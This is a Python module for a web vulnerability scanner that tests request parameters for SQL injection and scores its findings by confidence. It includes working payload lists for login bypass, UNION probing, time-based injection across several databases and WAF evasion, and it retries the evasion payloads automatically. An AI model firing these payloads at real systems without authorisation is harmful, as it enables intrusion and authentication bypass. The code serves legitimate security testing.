import time
import re
from urllib.parse import urlparse

SQLI_PAYLOADS = [
    {"name": "single_quote", "payload": "'"},
    {"name": "double_quote", "payload": "\""},
    {"name": "or_true_dash", "payload": "' OR '1'='1' --"},
    {"name": "or_true_hash", "payload": "' OR 1=1#"},
    {"name": "or_true_double_dash", "payload": "' OR '1'='1' -- -"},
    {"name": "admin_bypass", "payload": "admin' --"},
    {"name": "admin_bypass_hash", "payload": "admin'#"},
    {"name": "or_false", "payload": "' AND 1=2 --"},
    {"name": "union_select_null", "payload": "' UNION SELECT NULL--"},
    {"name": "union_select_nulls", "payload": "' UNION SELECT NULL,NULL,NULL--"},
    {"name": "order_by_1", "payload": "' ORDER BY 1--"},
    {"name": "order_by_100", "payload": "' ORDER BY 100--"},
    {"name": "boolean_true", "payload": "' AND '1'='1"},
    {"name": "boolean_false", "payload": "' AND '1'='2"},
    {"name": "boolean_true_number", "payload": " AND 1=1 --"},
    {"name": "boolean_false_number", "payload": " AND 1=2 --"},
    {"name": "time_sleep_5_mysql1", "payload": "' AND SLEEP(5) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_mysql2", "payload": "' AND (SELECT SLEEP(5)) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_mysql3", "payload": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_mysql4", "payload": "'; SELECT SLEEP(5) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_pg1", "payload": "'; SELECT pg_sleep(5) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_pg2", "payload": "' AND (SELECT pg_sleep(5)) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_mssql1", "payload": "'; WAITFOR DELAY '0:0:5' --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_mssql2", "payload": "' WAITFOR DELAY '0:0:5' --", "time_based": True, "sleep_sec": 5},
    {"name": "time_sleep_5_oracle", "payload": "' AND DBMS_LOCK.SLEEP(5) --", "time_based": True, "sleep_sec": 5},
    {"name": "time_benchmark", "payload": "' AND BENCHMARK(5000000,MD5(1)) --", "time_based": True, "sleep_sec": 3},
]

ERROR_PATTERNS = [
    "sql syntax", "mysql error", "mysql_fetch", "mysql_num_rows",
    "mysqli", "pg_query", "postgresql", "sqlite3::",
    "sqlite_error", "ora-", "oracle error", "mssql_",
    "odbc error", "driver error", "unclosed quotation",
    "quoted string not properly terminated", "division by zero",
    "supplied argument is not a valid mysql", "warning: mysql",
    "you have an error in your sql syntax", "microsoft ole db",
    "unexpected end of sql command", "invalid query",
    "sqlcommand", "sqlstate", "jdbc", "syntax error",
    "unexpected token", "unexpected character",
]

# Database-specific error patterns for validation
DB_SPECIFIC_ERRORS = {
    "mysql": ["mysql", "mysqli", "mysql_fetch", "mysql_num_rows", "you have an error in your sql syntax", 
              "warning: mysql", "supplied argument is not a valid mysql"],
    "postgresql": ["postgresql", "pg_query", "pg_", "psql", "sqlstate"],
    "mssql": ["microsoft ole db", "mssql", "sql server", "odbc sql server", "sqlcommand"],
    "oracle": ["ora-", "oracle", "pls-"],
    "sqlite": ["sqlite", "sqlite3::", "sqlite_error"],
}

AUTH_REDIRECT_PATHS = ["/dashboard", "/admin", "/home", "/panel", "/account", "/profile", "/user", "/backend", "/cp", "/manage", "/settings"]

WAF_BYPASS_PAYLOADS = [
    {"name": "waf_bypass_case", "payload": "' Or '1'='1' --"},
    {"name": "waf_bypass_comment", "payload": "'/**/OR/**/1=1/**/--"},
    {"name": "waf_bypass_urlencode", "payload": "%27%20OR%20%271%27%3D%271"},
    {"name": "waf_bypass_nullbyte", "payload": "' OR 1=1;%00--"},
    {"name": "waf_bypass_newline", "payload": "' OR 1=1\n--"},
]

# Confidence scoring for different detection types
CONFIDENCE_SCORES = {
    "time_based_double_verified": 0.95,
    "error_based_db_match": 0.90,
    "auth_bypass_redirect": 0.95,
    "session_cookie_gain": 0.95,
    "boolean_differential_strong": 0.85,
    "boolean_differential_moderate": 0.70,
    "error_based_generic": 0.40,
    "status_code_error": 0.60,
    "status_code_boolean": 0.45,
    "size_differential": 0.30,
    "wrong_db_type_error": 0.20,  # Likely false positive
}


def _get_db_type_from_error(error_text):
    """Determine database type from error message"""
    error_lower = error_text.lower()
    detected_dbs = []
    
    for db_type, patterns in DB_SPECIFIC_ERRORS.items():
        for pattern in patterns:
            if pattern in error_lower:
                detected_dbs.append(db_type)
                break
    
    # Return the most specific match (longest pattern match) or generic
    if detected_dbs:
        # Prioritize specific matches
        for db in ["mysql", "postgresql", "mssql", "oracle", "sqlite"]:
            if db in detected_dbs:
                return db
        return detected_dbs[0]
    
    return "generic"


def _get_target_db_from_tech_stack(engine):
    """Extract database type from detected tech stack"""
    tech_stack = engine.results.get("tech_stack", [])
    
    for tech in tech_stack:
        tech_lower = tech.lower()
        if "mysql" in tech_lower:
            return "mysql"
        elif "mariadb" in tech_lower:
            return "mysql"
        elif "postgresql" in tech_lower or "postgres" in tech_lower:
            return "postgresql"
        elif "sqlite" in tech_lower:
            return "sqlite"
        elif "mssql" in tech_lower or "sql server" in tech_lower:
            return "mssql"
        elif "oracle" in tech_lower:
            return "oracle"
        elif "flask" in tech_lower or "django" in tech_lower:
            # Python frameworks typically use MySQL, PostgreSQL, or SQLite
            # Check aggressive_mode in results if available
            aggressive_mode = engine.results.get("aggressive_mode", {})
            if aggressive_mode and aggressive_mode.get("sqli"):
                return "unknown_python"
    
    # Check server header for hints
    if hasattr(engine, 'last_response') and engine.last_response:
        server_header = engine.last_response.headers.get("Server", "").lower()
        if "apache" in server_header or "php" in server_header:
            return "mysql"  # LAMP stack typically uses MySQL
    
    return None


def _smart_replace_sleep(payload, old_seconds, new_seconds):
    """Intelligently replace sleep time values in various SQL dialects"""
    old_str = str(old_seconds)
    new_str = str(new_seconds)
    
    # Handle WAITFOR DELAY format '0:0:5' -> '0:0:2'
    if "WAITFOR DELAY" in payload.upper():
        pattern = r"'(\d+:?\d*:\d+)'"
        match = re.search(pattern, payload)
        if match:
            old_time = match.group(1)
            parts = old_time.split(':')
            if len(parts) == 3:
                parts[-1] = new_str.zfill(2)
                new_time = ':'.join(parts)
            elif len(parts) == 2:
                parts[-1] = new_str.zfill(2)
                new_time = ':'.join(parts)
            else:
                new_time = f"0:0:{new_str.zfill(2)}"
            return payload.replace(old_time, new_time)
    
    # Handle standard SLEEP/BENCHMARK numeric values
    return payload.replace(old_str, new_str)


def _check_redirect_auth_bypass(baseline_resp, injection_resp, param_name, entry, engine):
    """Fixed: Check for redirect location CHANGES to sensitive paths"""
    if injection_resp is None or baseline_resp is None:
        return None
    
    injection_redirect = injection_resp.status_code in (301, 302, 303, 307, 308)
    if not injection_redirect:
        return None
    
    baseline_redirect = baseline_resp.status_code in (301, 302, 303, 307, 308)
    baseline_location = baseline_resp.headers.get("Location", "") if baseline_redirect else ""
    injection_location = injection_resp.headers.get("Location", "")
    
    # Case 1: Baseline didn't redirect, injection does redirect to sensitive path
    if not baseline_redirect:
        for path in AUTH_REDIRECT_PATHS:
            if path in injection_location.lower():
                engine._log("VULN", f"CRITICAL: SQLi Auth Bypass on '{param_name}' via {entry['name']}")
                engine._log("VULN", f"  Baseline: no redirect, Injection: redirect to {injection_location}")
                return {
                    "type": "auth_bypass_redirect_new",
                    "baseline_location": None,
                    "injection_location": injection_location,
                    "detail": f"Injection ({entry['name']}) caused new redirect to {injection_location} (baseline had no redirect)",
                    "confidence": CONFIDENCE_SCORES["auth_bypass_redirect"]
                }
    
    # Case 2: Both redirect, but to DIFFERENT locations (injection redirects to sensitive path)
    elif baseline_redirect:
        for path in AUTH_REDIRECT_PATHS:
            if path in injection_location.lower() and path not in baseline_location.lower():
                engine._log("VULN", f"CRITICAL: SQLi Auth Bypass on '{param_name}' via {entry['name']}")
                engine._log("VULN", f"  Redirect changed: '{baseline_location}' → '{injection_location}'")
                return {
                    "type": "auth_bypass_redirect_change",
                    "baseline_location": baseline_location,
                    "injection_location": injection_location,
                    "detail": f"Injection ({entry['name']}) changed redirect from '{baseline_location}' to '{injection_location}'",
                    "confidence": CONFIDENCE_SCORES["auth_bypass_redirect"]
                }
    
    return None


def _check_boolean_differential(baseline_resp, true_resp, false_resp, threshold=0.03):
    """Comprehensive boolean blind SQLi detection using multiple metrics"""
    if not all([baseline_resp, true_resp, false_resp]):
        return False, {}, 0.0
    
    baseline_len = len(baseline_resp.text)
    true_len = len(true_resp.text)
    false_len = len(false_resp.text)
    
    evidence = {}
    confidence = 0.0
    
    # Metric 1: Content length differences
    true_vs_false_diff = abs(true_len - false_len) / max(true_len, false_len, 1)
    true_vs_base_diff = abs(true_len - baseline_len) / max(true_len, baseline_len, 1)
    false_vs_base_diff = abs(false_len - baseline_len) / max(false_len, baseline_len, 1)
    
    if true_vs_false_diff > threshold:
        evidence["length_diff_true_false"] = f"{true_len} vs {false_len} ({true_vs_false_diff:.1%})"
        confidence = CONFIDENCE_SCORES["boolean_differential_strong"]
    
    # Metric 2: One response matches baseline, the other doesn't
    if (true_vs_base_diff < threshold/2 and false_vs_base_diff > threshold):
        evidence["baseline_match"] = f"true≈baseline({true_len}), false differs({false_len})"
        confidence = max(confidence, CONFIDENCE_SCORES["boolean_differential_strong"])
    
    if (false_vs_base_diff < threshold/2 and true_vs_base_diff > threshold):
        evidence["baseline_match"] = f"false≈baseline({false_len}), true differs({true_len})"
        confidence = max(confidence, CONFIDENCE_SCORES["boolean_differential_strong"])
    
    # Metric 3: Status code differences
    if true_resp.status_code != false_resp.status_code:
        evidence["status_diff"] = f"true: {true_resp.status_code}, false: {false_resp.status_code}"
        confidence = max(confidence, CONFIDENCE_SCORES["boolean_differential_moderate"])
    
    # Metric 4: Keyword presence/absence
    keywords = ["error", "invalid", "not found", "no results", "0 results", "no rows"]
    for kw in keywords:
        true_has = kw in true_resp.text.lower()
        false_has = kw in false_resp.text.lower()
        if true_has != false_has:
            evidence["keyword_diff"] = f"'{kw}' present in {'true' if true_has else 'false'} only"
            confidence = max(confidence, CONFIDENCE_SCORES["boolean_differential_moderate"])
            break
    
    return bool(evidence), evidence, confidence


def _check_status_code_change(baseline_resp, injection_resp, param_name, entry, engine):
    """Enhanced status code analysis with severity grading and confidence scoring"""
    if injection_resp is None or baseline_resp is None:
        return None
    
    baseline_status = baseline_resp.status_code
    injection_status = injection_resp.status_code
    
    if baseline_status == injection_status:
        return None
    
    # Skip redirects (handled separately)
    if injection_status in (301, 302, 303, 307, 308):
        return None
    
    result = {
        "type": "status_code_change",
        "baseline": baseline_status,
        "injection": injection_status,
    }
    
    # Error-based SQLi (200 -> 500)
    if baseline_status == 200 and injection_status >= 500:
        engine._log("VULN", f"HIGH: Potential error-based SQLi on '{param_name}' via {entry['name']}")
        engine._log("VULN", f"  Status changed: {baseline_status} (OK) → {injection_status} (Server Error)")
        result["type"] = "status_code_error"
        result["confidence"] = CONFIDENCE_SCORES["status_code_error"]
        result["detail"] = f"Injection caused internal server error - potential error-based SQLi"
        return result
    
    # Boolean-based indicator (200 -> 404)
    if baseline_status == 200 and injection_status == 404:
        engine._log("INFO", f"Boolean-based SQLi indicator on '{param_name}' via {entry['name']}")
        engine._log("INFO", f"  Status changed: {baseline_status} (OK) → {injection_status} (Not Found)")
        result["type"] = "status_code_boolean"
        result["confidence"] = CONFIDENCE_SCORES["status_code_boolean"]
        result["detail"] = f"Status change indicates possible boolean-based SQLi"
        return result
    
    # Generic change (still interesting)
    result["confidence"] = 0.25
    result["detail"] = f"Status changed: {baseline_status} → {injection_status}"
    return result


def _check_session_cookie_gain(baseline_resp, injection_resp, param_name, entry, engine):
    """Detect new session cookies issued after injection"""
    if injection_resp is None:
        return None
    
    baseline_cookies = baseline_resp.headers.get("Set-Cookie", "") if baseline_resp else ""
    injection_cookies = injection_resp.headers.get("Set-Cookie", "")
    
    if not injection_cookies:
        return None
    
    if baseline_cookies == injection_cookies:
        return None
    
    # Extract cookie names
    def extract_cookie_name(cookie_str):
        if not cookie_str:
            return ""
        return cookie_str.split("=")[0] if "=" in cookie_str else cookie_str.split(";")[0]
    
    baseline_name = extract_cookie_name(baseline_cookies)
    injection_name = extract_cookie_name(injection_cookies)
    
    # New cookie name that wasn't in baseline
    if injection_name and injection_name != baseline_name:
        # Check if it's actually a session cookie
        session_indicators = ["session", "sess", "token", "auth", "login", "sid", "jsessionid", "phpsessid"]
        is_session_cookie = any(ind in injection_name.lower() for ind in session_indicators)
        
        confidence = CONFIDENCE_SCORES["session_cookie_gain"] if is_session_cookie else 0.60
        
        engine._log("VULN", f"CRITICAL: New session cookie issued after SQLi on '{param_name}'")
        engine._log("VULN", f"  Cookie: {injection_cookies[:100]}")
        return {
            "type": "session_cookie_gain",
            "cookie_name": injection_name,
            "cookie_preview": injection_cookies[:150],
            "detail": f"Injection caused new session cookie '{injection_name}' (possible authentication bypass)",
            "confidence": confidence
        }
    
    return None


def _check_waf_detection(baseline_resp, injection_resp, param_name, entry, engine):
    """Improved WAF detection with false positive reduction"""
    if injection_resp is None or baseline_resp is None:
        return None
    
    baseline_status = baseline_resp.status_code
    injection_status = injection_resp.status_code
    
    # Only flag if baseline was successful and injection was explicitly blocked
    if baseline_status in [200, 302] and injection_status in [403, 406, 429, 500]:
        # Check if it's a generic input validation (less likely to be WAF)
        injection_text = injection_resp.text.lower()
        validation_indicators = [
            "input validation", "invalid parameter", "invalid input",
            "malformed request", "bad request", "required parameter"
        ]
        
        if any(ind in injection_text for ind in validation_indicators):
            return None
        
        # Check if it's just application error handling
        if injection_status == 500 and "error" not in injection_text:
            return None
        
        engine._log("WARN", f"Potential WAF detected on '{param_name}' via {entry['name']}")
        engine._log("WARN", f"  Baseline: {baseline_status}, Payload blocked: {injection_status}")
        
        return {
            "type": "waf_detected",
            "status": injection_status,
            "detail": f"Payload {entry['name']} blocked with status {injection_status}",
            "suggestions": [
                "Use case variation: ' Or '1'='1",
                "Add comments: '/**/OR/**/1=1",
                "URL encode: %27%20OR%20%271%27%3D%271",
                "Use alternative operators: ||, &&",
                "Try null bytes: %00",
            ],
        }
    
    return None


def _check_error_patterns_with_validation(baseline_text, response_text, engine, param_name):
    """Enhanced error checking with database validation and confidence scoring"""
    if not response_text:
        return [], 0.0, None
    
    response_lower = response_text.lower()
    baseline_lower = baseline_text.lower() if baseline_text else ""
    
    found_errors = []
    detected_db = None
    
    # Detect database type from errors
    for pattern in ERROR_PATTERNS:
        if pattern in response_lower:
            if pattern not in baseline_lower:
                found_errors.append(pattern)
                
                # Determine DB type from this error
                if not detected_db:
                    detected_db = _get_db_type_from_error(pattern)
    
    if not found_errors:
        return [], 0.0, None
    
    # Validate against detected tech stack
    target_db = _get_target_db_from_tech_stack(engine)
    
    # Set confidence based on match
    if detected_db and target_db:
        if detected_db == target_db:
            confidence = CONFIDENCE_SCORES["error_based_db_match"]
            engine._log("INFO", f"  Error matches detected DB ({target_db}) - high confidence")
        elif target_db == "unknown_python" and detected_db in ["mysql", "postgresql", "sqlite"]:
            # Python frameworks commonly use these - medium confidence
            confidence = 0.65
            engine._log("INFO", f"  Error suggests {detected_db} - compatible with Python framework (medium confidence)")
        else:
            confidence = CONFIDENCE_SCORES["wrong_db_type_error"]
            engine._log("INFO", f"  Error suggests {detected_db} but target appears to use {target_db} - likely false positive, ignoring")
            found_errors = []  # Clear errors to avoid false positive
    elif detected_db:
        confidence = 0.55  # Medium-low - error detected but tech unknown
        engine._log("INFO", f"  Error detected ({detected_db}) but tech stack unknown - medium-low confidence")
    else:
        confidence = CONFIDENCE_SCORES["error_based_generic"]
        engine._log("INFO", f"  Generic SQL error detected - low confidence")
    
    return found_errors, confidence, detected_db


def _check_size_differential(baseline_len, response_len):
    """Check for significant response size changes"""
    if baseline_len == 0:
        return False, 0.0
    
    diff_ratio = abs(response_len - baseline_len) / baseline_len
    
    # Significant change (>20%)
    if diff_ratio > 0.20:
        return True, CONFIDENCE_SCORES["size_differential"]
    
    return False, 0.0


def sqli_check(engine):
    """Main SQLi detection function with comprehensive analysis and false positive reduction"""
    engine._log("INFO", f"Starting comprehensive SQLi detection on {engine.target_url}")
    results = []
    waf_detected_params = set()
    
    # Get target database type for validation
    target_db = _get_target_db_from_tech_stack(engine)
    if target_db:
        engine._log("INFO", f"Target database type inferred: {target_db}")

    params = engine.extract_params()
    if not params:
        engine._log("WARN", "No parameters found for SQLi testing")
        return results

    for param in params:
        engine._log("INFO", f"Testing parameter: '{param}'")
        
        # Get baseline
        baseline_start = time.time()
        baseline_resp = engine.baseline(param)
        baseline_time = time.time() - baseline_start
        
        if baseline_resp is None:
            engine._log("WARN", f"Skipping '{param}' — baseline request failed")
            continue
        
        baseline_text = baseline_resp.text
        baseline_text_lower = baseline_text.lower()
        baseline_len = len(baseline_text)
        
        engine._log("INFO", f"  Baseline: {baseline_time:.2f}s, status={baseline_resp.status_code}, size={baseline_len} bytes")
        
        param_confirmed = False
        waf_detected_for_param = False
        highest_confidence = 0.0
        
        # Test boolean pairs first (more reliable)
        boolean_true_resp = None
        boolean_false_resp = None
        
        for entry in SQLI_PAYLOADS:
            if param_confirmed and highest_confidence >= 0.85:
                break
                
            if entry["name"] == "boolean_true":
                args = engine.build_request_args(param, entry["payload"])
                boolean_true_resp = engine.request(**args)
            elif entry["name"] == "boolean_false":
                args = engine.build_request_args(param, entry["payload"])
                boolean_false_resp = engine.request(**args)
        
        # Check boolean differential if we have both responses
        if boolean_true_resp and boolean_false_resp:
            is_boolean, evidence, confidence = _check_boolean_differential(
                baseline_resp, boolean_true_resp, boolean_false_resp
            )
            if is_boolean and confidence >= 0.65:  # Only report medium+ confidence
                confidence_level = "high" if confidence >= 0.80 else "medium"
                engine._log("VULN", f"{confidence_level.upper()}: Boolean-based blind SQLi in '{param}' (confidence: {confidence:.0%})")
                for key, value in evidence.items():
                    engine._log("VULN", f"  {key}: {value}")
                
                results.append({
                    "parameter": param,
                    "payload_type": "boolean_blind",
                    "payload_true": "' AND '1'='1",
                    "payload_false": "' AND '1'='2",
                    "evidence": evidence,
                    "status_true": boolean_true_resp.status_code,
                    "status_false": boolean_false_resp.status_code,
                    "confidence": confidence,
                    "confidence_level": confidence_level,
                    "severity": "high" if confidence >= 0.80 else "medium",
                    "detail": "Boolean-based blind SQL injection confirmed via differential analysis",
                })
                param_confirmed = True
                highest_confidence = confidence
                continue
        
        # Test all payloads
        for entry in SQLI_PAYLOADS:
            if param_confirmed and highest_confidence >= 0.90:
                break
            
            # Skip boolean payloads (already tested above)
            if entry["name"] in ["boolean_true", "boolean_false"]:
                continue
            
            args = engine.build_request_args(param, entry["payload"])
            start = time.time()
            resp = engine.request(**args)
            elapsed = time.time() - start
            
            if resp is None:
                continue
            
            resp_text = resp.text
            resp_text_lower = resp_text.lower()
            resp_len = len(resp_text)
            
            confirmed = False
            evidence = []
            extra = {}
            confidence = 0.0
            severity = "medium"
            
            # 1. Check for WAF
            waf = _check_waf_detection(baseline_resp, resp, param, entry, engine)
            if waf:
                extra["waf"] = waf
                waf_detected_for_param = True
            
            # 2. Check for auth bypass via redirect
            redirect_bypass = _check_redirect_auth_bypass(baseline_resp, resp, param, entry, engine)
            if redirect_bypass:
                confirmed = True
                severity = "critical"
                confidence = redirect_bypass.get("confidence", CONFIDENCE_SCORES["auth_bypass_redirect"])
                extra["auth_bypass"] = redirect_bypass
                evidence.append(f"Auth bypass: {redirect_bypass.get('detail', '')}")
            
            # 3. Check for new session cookie
            session_gain = _check_session_cookie_gain(baseline_resp, resp, param, entry, engine)
            if session_gain:
                confirmed = True
                severity = "critical"
                confidence = max(confidence, session_gain.get("confidence", 0.95))
                extra["session_cookie"] = session_gain
                evidence.append(f"New session cookie: {session_gain['cookie_name']}")
            
            # 4. Check status code changes
            status_change = _check_status_code_change(baseline_resp, resp, param, entry, engine)
            if status_change:
                status_confidence = status_change.get("confidence", 0.25)
                if status_confidence >= 0.60:
                    confirmed = True
                    severity = "high" if status_confidence >= 0.70 else "medium"
                confidence = max(confidence, status_confidence)
                extra["status_change"] = status_change
                evidence.append(status_change.get("detail", ""))
            
            # 5. Check for SQL errors with validation
            new_errors, error_confidence, detected_db = _check_error_patterns_with_validation(
                baseline_text_lower, resp_text_lower, engine, param
            )
            
            if new_errors and error_confidence >= 0.50:  # Only report if medium+ confidence
                confirmed = True
                severity = "high" if error_confidence >= 0.70 else "medium"
                confidence = max(confidence, error_confidence)
                evidence.append(f"SQL errors ({detected_db or 'generic'}): {', '.join(new_errors[:3])}")
                extra["errors"] = new_errors
                extra["detected_db"] = detected_db
            
            # 6. Time-based detection
            if entry.get("time_based"):
                threshold = baseline_time + (entry["sleep_sec"] * 0.8)  # 80% of expected delay
                
                if elapsed > threshold:
                    engine._log("INFO", f"  Time anomaly: {elapsed:.2f}s (baseline: {baseline_time:.2f}s, threshold: {threshold:.2f}s)")
                    
                    # Double-verify with shorter sleep
                    confirm_payload = _smart_replace_sleep(entry["payload"], entry["sleep_sec"], 2)
                    confirm_args = engine.build_request_args(param, confirm_payload)
                    
                    start2 = time.time()
                    confirm_resp = engine.request(**confirm_args)
                    elapsed2 = time.time() - start2
                    
                    expected_confirm = baseline_time + 1.6  # 80% of 2 seconds
                    
                    if confirm_resp and elapsed2 > expected_confirm:
                        confirmed = True
                        severity = "high"
                        time_confidence = CONFIDENCE_SCORES["time_based_double_verified"]
                        confidence = max(confidence, time_confidence)
                        evidence.append(f"Time-based: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)")
                        evidence.append(f"Verified: {elapsed2:.2f}s with SLEEP(2)")
                        extra["time_evidence"] = {
                            "primary": round(elapsed, 2),
                            "confirm": round(elapsed2, 2),
                            "payload": entry["payload"],
                            "confirm_payload": confirm_payload,
                        }
                        engine._log("VULN", f"HIGH: Time-based SQLi CONFIRMED in '{param}' via {entry['name']} (confidence: {time_confidence:.0%})")
            
            # 7. Content length differential
            size_diff_detected, size_confidence = _check_size_differential(baseline_len, resp_len)
            if size_diff_detected and not confirmed:
                evidence.append(f"Response size changed: {baseline_len} → {resp_len}")
                extra["size_diff"] = {
                    "baseline": baseline_len,
                    "injection": resp_len,
                }
                confidence = max(confidence, size_confidence)
            
            # Record finding if confirmed with sufficient confidence
            if confirmed and confidence >= 0.50:  # Minimum confidence threshold
                confidence_level = "high" if confidence >= 0.80 else "medium" if confidence >= 0.65 else "low"
                
                result_entry = {
                    "parameter": param,
                    "payload_type": entry["name"],
                    "payload": entry["payload"],
                    "evidence": evidence,
                    "status": resp.status_code,
                    "confidence": confidence,
                    "confidence_level": confidence_level,
                    "severity": severity,
                }
                
                if extra.get("waf"):
                    result_entry["waf"] = extra["waf"]
                if extra.get("auth_bypass"):
                    result_entry["auth_bypass"] = extra["auth_bypass"]
                if extra.get("session_cookie"):
                    result_entry["session_cookie"] = extra["session_cookie"]
                if extra.get("time_evidence"):
                    result_entry["time_evidence"] = extra["time_evidence"]
                if extra.get("status_change"):
                    result_entry["status_change"] = extra["status_change"]
                if extra.get("errors"):
                    result_entry["errors"] = extra["errors"][:5]
                if extra.get("detected_db"):
                    result_entry["detected_db"] = extra["detected_db"]
                if extra.get("size_diff"):
                    result_entry["size_diff"] = extra["size_diff"]
                
                results.append(result_entry)
                param_confirmed = True
                highest_confidence = max(highest_confidence, confidence)
        
        # Try WAF bypass if WAF detected but no vulnerability found
        if waf_detected_for_param and not param_confirmed:
            engine._log("INFO", f"Attempting WAF bypass techniques for '{param}'")
            for bypass in WAF_BYPASS_PAYLOADS[:3]:  # Try first 3 bypass techniques
                args = engine.build_request_args(param, bypass["payload"])
                resp = engine.request(**args)
                
                if resp and resp.status_code == 200:
                    # Check for auth bypass with bypassed payload
                    redirect_bypass = _check_redirect_auth_bypass(baseline_resp, resp, param, bypass, engine)
                    if redirect_bypass:
                        engine._log("VULN", f"CRITICAL: SQLi Auth Bypass achieved via WAF bypass on '{param}'")
                        results.append({
                            "parameter": param,
                            "payload_type": f"waf_bypass_{bypass['name']}",
                            "payload": bypass["payload"],
                            "evidence": ["WAF bypassed successfully", f"Auth bypass: {redirect_bypass.get('detail', '')}"],
                            "auth_bypass": redirect_bypass,
                            "confidence": 0.95,
                            "confidence_level": "high",
                            "severity": "critical",
                        })
                        param_confirmed = True
                        break
        
        if waf_detected_for_param and not param_confirmed:
            waf_detected_params.add(param)
            engine._log("WARN", f"WAF blocking SQLi attempts on '{param}' — consider manual testing")

    # Filter results by confidence (remove low confidence findings)
    filtered_results = [r for r in results if r.get("confidence", 0) >= 0.50]
    
    # Summary
    if waf_detected_params:
        engine._log("WARN", f"WAF detected on parameters: {', '.join(waf_detected_params)}")
    
    engine.results["sqli"] = filtered_results
    engine._log("INFO", f"SQLi detection complete. Found: {len(filtered_results)} vulnerability(ies) with medium+ confidence.")
    
    # Log filtered out low confidence findings
    filtered_count = len(results) - len(filtered_results)
    if filtered_count > 0:
        engine._log("INFO", f"Filtered out {filtered_count} low-confidence finding(s) to reduce false positives.")
    
    return filtered_results